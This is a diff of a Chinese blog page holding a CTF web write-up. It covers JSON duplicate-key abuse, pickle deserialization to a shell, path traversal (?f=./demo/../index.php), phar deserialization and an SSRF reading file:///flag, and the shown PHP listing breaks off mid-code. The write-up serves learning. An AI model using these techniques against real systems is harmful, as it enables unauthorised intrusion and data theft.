+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731222837469-20220805163257090.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731222837469.png"></p>
 <p>把源码买下来：</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731230017724-20220805163257124.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731230017724.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731230017724-20220805163257124.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731230017724.png"></p>
 <p>看到购买的时候post的是json，那就说明肯定和json有关，而且有python和go两个服务，</p>
 <p>简单搜了下：</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731232733719-20220805163257275.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731232733719.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731232733719-20220805163257275.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731232733719.png"></p>
 <p>大概意思就是python和golang的重复键的优先级存在差异。这里就是为了让他出粗，让其cost只加200*num，所以利用重复键导致其出差即可：</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731224340655-20220805163257354.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731224340655.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731224340655-20220805163257354.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731224340655.png"></p>
 <p>最后放包到浏览器就出来了：</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731224410345-20220805163257415.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731224410345.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731224410345-20220805163257415.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731224410345.png"></p>
 <h3 id="crash"><a href="#crash" class="headerlink" title="crash"></a><strong>crash</strong></h3><p>整个代码逻辑很简单，login处序列化用户信息：</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731232936006-20220805163257463.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731232936006.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731232936006-20220805163257463.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731232936006.png"></p>
 <p>balacn处反序列化：</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731232959640-20220805163257498.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731232959640.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731232959640-20220805163257498.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731232959640.png"></p>
 <p>过滤了R操作码和secret，第一反应就是用b、o、i操作码去弹shell：</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731233218929-20220805163257574.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731233218929.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731233218929-20220805163257574.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731233218929.png"></p>
 <p>先login下，在修改userdata，访问balancer触发即可。</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731233432376-20220805163257675.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731233432376.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731233432376-20220805163257675.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731233432376.png"></p>
 <p>到这里都很简单，但是一直找不到flag，看了下题目描述，肯定得让服务器504请求超时才行。</p>
 <p>就想的是往shell里面执行一些死循环来卡死服务，但是当你反弹shell之后，服务器就502了，也无法再进行操作，就拿这个shell思路卡了挺久，也去读了一些nginx的源码来看，查看了最近被修改的文件，一直没有思路。。。</p>
 <p>后面再回来看下源码：</p>
 <p>找不到flag的原因肯定和在反序列化之前删除了python文件有关，但是也无法找回，但是看到一句hint：</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731233729868-20220805163257742.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731233729868.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731233729868-20220805163257742.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731233729868.png"></p>
 <p>意思是如果为admin才会有下一关，所以这里应该就得伪装admin，这里肯定就是变量覆盖就是，但是secrte也被过滤了，字符拼接直接绕，还是利用o操作码：</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731234920404-20220805163257802.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731234920404.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731234920404-20220805163257802.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731234920404.png"></p>
 <p>重新下发题目，直接变量覆盖secret：</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731235101626-20220805163257835.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731235101626.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731235101626-20220805163257835.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731235101626.png"></p>
 <p>error即正确，访问&#x2F;login?username&#x3D;admin&amp;password&#x3D;w0s1np</p>
 <p>进去就是服务器负载均衡设置，也不太清除是干啥的，就输了三台vps的ip，权重乱试了下，全为1就卡出来了。。。</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731235917255-20220805163257917.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731235917255.png"></p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/25066558C908B6408A08C7B0541B2CA6-20220805163257951.jpg" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/25066558C908B6408A08C7B0541B2CA6.jpg"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731235917255-20220805163257917.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731235917255.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/25066558C908B6408A08C7B0541B2CA6-20220805163257951.jpg" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/25066558C908B6408A08C7B0541B2CA6.jpg"></p>
 <p>赛后看到这个和b站的崩溃有关。。。题目出得挺好的。</p>
 <h3 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a><strong>easyweb</strong></h3><p>有个文件读取，然后要有demo关键字，目录穿越绕过就行</p>
 <p>?f&#x3D;.&#x2F;demo&#x2F;..&#x2F;index.php</p>
 <p>然后把相关的php文件都读出来，然后class.php里有个类有ssrf漏洞，想办法触发</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220730222941247.png" alt="image-20220730222941247"></p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220730222953917.png" alt="image-20220730222953917"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220730222941247.png" alt="image-20220730222941247"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220730222953917.png" alt="image-20220730222953917"></p>
 <p>这里触发的phar反序列化，file_get_contents我不知道为啥不能触发，我本地可以</p>
 <p>然后python那个文件，先上传一次($SESSION用PHP_SESSION_UPLOAD_PROGRESS绕过)，然后触发就可以了。</p>
 <p>然后看了&#x2F;etc&#x2F;hosts这个文件，然后试c段，然后发现10.10.10.10还有个ssrf，直接file:&#x2F;&#x2F;&#x2F;flag就可以了</p>
@@ -625,8 +224,8 @@
 <p>这个是phar生成的php代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Upload</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filesize</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$date</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">do_upload</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$filename</span> = <span class="title function_ invoke__">session_id</span>().<span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$this</span>-&gt;file[<span class="string">&quot;name&quot;</span>])[<span class="number">0</span>].<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$this</span>-&gt;file[<span class="string">&quot;tmp_name&quot;</span>],<span class="title function_ invoke__">md5</span>(<span class="string">&quot;2022qwb&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]).<span class="string">&quot;/&quot;</span>.<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;upload  &#x27;</span>.<span class="string">&quot;./&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="string">&quot;2022qwb&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]).<span class="string">&quot;/&quot;</span>.<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">e</span>(<span class="variable">$filename</span>).<span class="string">&#x27; success!&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>()) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">do_upload</span>();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;file[<span class="string">&quot;name&quot;</span>];</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filesize-&gt;<span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;date;</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;tmp;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$allowed_types</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;jpeg&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$this</span>-&gt;file[<span class="string">&quot;name&quot;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>,<span class="variable">$allowed_types</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Invalid file!&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GuestShow</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$contents</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file=<span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$str</span> = <span class="variable language_">$this</span>-&gt;file-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$value</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;contents = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">        <span class="variable">$src</span> = <span class="string">&quot;data:jpg;base64,&quot;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$this</span>-&gt;contents);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=<span class="subst">&#123;$src&#125;</span> /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminShow</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filter</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;test.php&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;schema = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;str[<span class="number">0</span>]-&gt;source;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$content</span> = <span class="variable 